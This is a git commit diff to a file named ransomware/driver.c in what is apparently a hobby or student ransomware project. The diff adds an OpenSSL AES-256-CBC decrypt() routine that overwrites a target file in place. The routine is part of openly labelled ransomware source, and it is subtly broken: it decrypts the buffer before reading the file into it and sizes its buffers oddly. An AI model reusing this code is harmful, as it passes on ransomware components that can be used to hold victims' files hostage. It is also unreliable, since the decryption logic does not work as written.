2b1abb5bfe37094e50fc07d903df8c34d37ae540
ChristopherDiehl <csd92@scarletmail.rutgers.edu>
2016-09-02 23:19:31 -0400

    driver

--- ransomware/driver.c
+++ ransomware/driver.c
@@ -1,5 +1,44 @@
 #include <stdio.h>
 #include "encrypt.h"
+#include <openssl/evp.h>
+#include <string.h>
+#include <stdlib.h>
+#include <ctype.h>
+#include <sys/stat.h>
+#include <stdio.h>
+
+int decrypt(char * filename, unsigned char * key, unsigned char * iv)
+{
+	size_t file_length = get_file_length(filename)+1;
+	FILE * encrypted_file = fopen(filename,"rb");
+	int out1 = 0; int out2 = 0;
+	unsigned char * encrypted_file_buffer = malloc(file_length);
+	unsigned char * decrypted_file_buffer = malloc(file_length- BUFFSIZE);
+
+
+	EVP_CIPHER_CTX * ctx = EVP_CIPHER_CTX_new();
+	if ( 1 != EVP_DecryptInit_ex(ctx,EVP_aes_256_cbc(),NULL,key,iv))
+		exit(-1);
+	EVP_DecryptUpdate(ctx,decrypted_file_buffer,&out1,encrypted_file_buffer,file_length);
+	EVP_DecryptFinal(ctx,decrypted_file_buffer+out1,&out2);
+
+	if(encrypted_file == 0)
+		exit(-1);
+
+	fread(encrypted_file_buffer,1,file_length,encrypted_file);
+	fclose(encrypted_file);
+	remove(filename);
+
+	FILE * decrypted_file = fopen(filename,"w");
+	fwrite(decrypted_file_buffer,1,out1+out2,decrypted_file);
+	fclose(decrypted_file);
+
+	free(encrypted_file_buffer);
+	free(decrypted_file_buffer);
+
+	return 1;
+}
+
 int main (int argc, char ** argv) 
 {
 	if (argc != 2)
